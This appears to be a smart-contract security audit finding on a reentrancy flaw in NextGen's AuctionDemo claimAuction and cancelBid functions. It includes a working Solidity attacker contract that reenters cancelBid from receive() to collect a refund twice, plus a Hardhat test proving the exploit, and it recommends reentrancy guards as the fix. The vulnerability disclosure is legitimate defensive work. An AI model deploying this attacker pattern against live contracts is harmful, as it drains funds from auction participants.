## H-01 AuctionDemo::claimAuction reentrancy issue
The function [claimAuction](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) and [cancelBid](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124) is not checking reentrancy and is not following the Checks Effects Interactions pattern, allowing one attacker contract to receive a "not-winner" bid amount and cancelling at the same transaction. 
This is possible because the function claimAuction is checking `block.timestamp >= minter.getAuctionEndTime(_tokenid)` and cancelBid is checking `require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended")`, allowing an attacker contract to call cancelBid function when receive the ethers from a 'not-winner' bid [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116).

To exploit this vulnerability successfully, an attacker must ensure that block.timestamp is equal to minter.getAuctionEndTime(_tokenid). This can be achieved by manipulating block.timestamp, which may be possible if the validator has control over it. Even if the attacker cannot manipulate block.timestamp, they can repeatedly bid in an auction and wait for the winner or admin to execute a transaction with the same timestamp. This attack has a low cost since the attacker can receive multiple bids. Also, the attacker contract can be the auction winner too.

## Impact
The attacker contract can steal funds from the AuctionDemo contract by receiving double payments for each bid (once from the "not-winner" transfer in claimAuction and once from the cancelBid function).

## Proof of Concept
First, create one attacker contract: (Attacker.sol)
```
pragma solidity ^0.8.19;

import './AuctionDemo.sol';
contract attacker {
     
    address public auctionDemoContract;
    bool attack;

    constructor(address _auctionDemoContract)
    {
        auctionDemoContract = _auctionDemoContract;
    }

    function participateToAuction(uint256 _tokenid) public payable {
        auctionDemo(auctionDemoContract).participateToAuction{ value: msg.value }(_tokenid);
    }

    function claimAuction(uint256 _tokenid) public {
        auctionDemo(auctionDemoContract).claimAuction(_tokenid); // if you are the highest bidder
    }
    receive() external payable {
        if (!attack) {
            attack = true;
            auctionDemo(auctionDemoContract).cancelBid(30000000002, 0); // just once this time, but you can put it on a looping.
        }
    }
}
```

Add this test just after line 315 [hardhat/test/nextGen.test.js#L350](https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/test/nextGen.test.js#L350)
```
    it("#auction", async function () {
      await contracts.hhMinter.mintAndAuction( // create an Auction
        signers.addr1.address, // recipient
        '{"tdh": "100"}', // _tokenData
        0, // _saltfun_o
        3, // _collectionID
        1799880280, // _auctionEndTime
      )
      const auctionDemo = await ethers.getContractFactory("auctionDemo")

      const hhAuctionDemo = await auctionDemo.deploy( // deploy auctionDemo contract
        await contracts.hhMinter.getAddress(),
        await contracts.hhCore.getAddress(),
        await contracts.hhAdmin.getAddress(),
      )

      const attackerContract = await ethers.getContractFactory("attacker")
      const hhAttacker = await attackerContract.deploy( // deploy attacker Contract
        await hhAuctionDemo.getAddress(),
      )

      await contracts.hhCore.connect(signers.addr1).approve(hhAuctionDemo.getAddress(), 30000000002); //approve token transfer

      await ethers.provider.send('evm_setNextBlockTimestamp', [1799880256]); // set block timestamp
      const bidAttackerAmount = 1000000000
      await hhAttacker.connect(signers.addr2).participateToAuction( // as attacker (index = 0)
        30000000002, //tokenId
        { value: bidAttackerAmount } // price
      );
      await hhAuctionDemo.connect(signers.addr2).participateToAuction( // as normal user
        30000000002, //tokenId
        { value: 1000000001 } // price
      );
      await hhAuctionDemo.connect(signers.addr2).participateToAuction( // as normal user
        30000000002, //tokenId
        { value: 1000000002 } // price
      );
      
      const balanceBefore = await ethers.provider.getBalance(
        hhAttacker.getAddress()
      )
      expect(parseInt(balanceBefore)).equal(0); // expect 0

      await ethers.provider.send('evm_setNextBlockTimestamp', [1799880280]); // set block timestamp to = _auctionEndTime
      await hhAuctionDemo.connect(signers.addr2).claimAuction(30000000002); // calling claimAuction as winner (normal user)
      const balanceAfter = await ethers.provider.getBalance(
        hhAttacker.getAddress()
      )
      expect(parseInt(balanceAfter)).equal(bidAttackerAmount); // expect equal bid value

    })

```
## Tools Used
hardhat, VS Code

## Recommended Mitigation Steps:
Add Reentrancy Guards to all function that transfers: ERC721 and native Ether.